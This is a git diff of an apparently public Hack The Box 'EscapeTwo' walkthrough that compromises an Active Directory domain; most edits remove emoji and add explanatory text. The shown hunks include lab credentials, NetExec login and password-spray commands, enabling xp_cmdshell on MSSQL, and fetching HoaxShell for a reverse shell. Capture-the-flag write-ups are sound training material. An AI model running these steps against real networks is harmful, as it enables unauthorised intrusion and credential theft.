@@ -11,7 +11,7 @@ pin: false
 
 This post demonstrates a full-path Active Directory compromise using initial credentials, misconfigured services, and post-exploitation techniques. Based on the retired [HTB EscapeTwo](https://app.hackthebox.com/machines/EscapeTwo) machine.
 
-## 🧠 Adversary Tradecraft Timeline
+## Adversary Tradecraft Timeline
 
 | Phase            | Tool/Action                    | Outcome                          |
 | ---------------- | ------------------------------ | -------------------------------- |
@@ -130,15 +130,20 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Fri Jun 13 12:47:06 2025 -- 1 IP address (1 host up) scanned in 222.04 seconds
 
 
-Then added this to /etc/hosts:
+We can identify it as a domain controller based on the open ports. Next, let’s add sequel.htb and dc01.sequel.htb to our /etc/hosts file.
 
 10.10.11.51 DC01.sequel.htb sequel.htb DC01
 
 ```
 
-## 🧪 Protocol Enumeration (NetExec)
+## Protocol Enumeration (NetExec)
 
 ```bash
+
+After identifying valid user credentials (rose:KxEPkKe6R8su) and confirming dc01.sequel.htb as the domain controller,
+we enumerate all exposed services for possible lateral movement or privilege escalation. Using NetExec, we test
+multiple protocols to check for access and identify misconfigurations.
+
 netexec smb dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'       # own stuff using SMB  
 netexec vnc dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'       # own stuff using VNC  
 netexec rdp dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'       # own stuff using RDP  
@@ -229,7 +234,7 @@ Kevin,Malone,kevin@sequel.htb,kevin,Md9Wlq1E5bZnVDVo
 NULL,sa@sequel.htb,sa,MSSQLP@ssw0rd!,
 ```
 
-## 🧪 Credential Spraying
+## Credential Spraying
 
 ```bash
 netexec smb sequel.htb -u users -p passwords --continue-on-success
@@ -256,7 +261,7 @@ EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
 ```
 
-## 👚 Reverse Shell (via HoaxShell)
+## Reverse Shell (via HoaxShell)
 
 ```bash
 git clone https://github.com/t3l3machus/hoaxshell
@@ -447,13 +452,13 @@ This permission enables a user to change the ownership of the targeted object �
 
 ```
 
-## 🏗️ Takeover ca_svc via ACL Abuse
+##  Takeover ca_svc via ACL Abuse
 
 ```bash
 
 ```
 
-## ⚙️ ADCS Abuse (ESC1 / ESC4)
+## ADCS Abuse (ESC1 / ESC4)
 
 ```bash
 Using certipy, I began enumerating the environment for vulnerable certificate templates:
